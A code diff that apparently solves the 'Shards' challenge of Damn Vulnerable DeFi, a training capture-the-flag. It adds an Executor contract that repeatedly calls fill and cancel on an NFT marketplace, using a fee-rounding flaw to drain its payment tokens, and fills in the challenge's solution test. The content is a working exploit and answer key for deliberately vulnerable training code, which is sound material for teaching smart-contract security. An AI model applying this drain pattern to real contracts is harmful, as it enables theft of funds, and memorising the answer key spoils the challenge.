@@ -12,6 +12,34 @@ import {
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
+contract Executor {
+
+    ShardsNFTMarketplace marketplace;
+    DamnValuableToken token;
+    address recovery;
+
+    constructor(address _marketplace, address _recovery) {
+        marketplace = ShardsNFTMarketplace(_marketplace);
+        token = marketplace.paymentToken();
+        recovery = _recovery;
+    }
+
+    function execute() external {
+        uint256 initialTokenBalanceInMarketplace = token.balanceOf(address(marketplace));
+        uint256 enoughToCrack = initialTokenBalanceInMarketplace * 1e16 / 100e18;
+
+        for (uint256 i = 0; ; ++i) {
+            marketplace.fill(1, 100);
+            if (token.balanceOf(address(this)) > enoughToCrack) {
+                break;
+            }
+            marketplace.cancel(1, i);
+        }
+        
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+}
+
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -114,7 +142,10 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        assertEq(marketplace.getFee(99, MARKETPLACE_INITIAL_RATE), 0);
+
+        Executor executor = new Executor(address(marketplace), recovery);
+        executor.execute();
     }
 
     /**
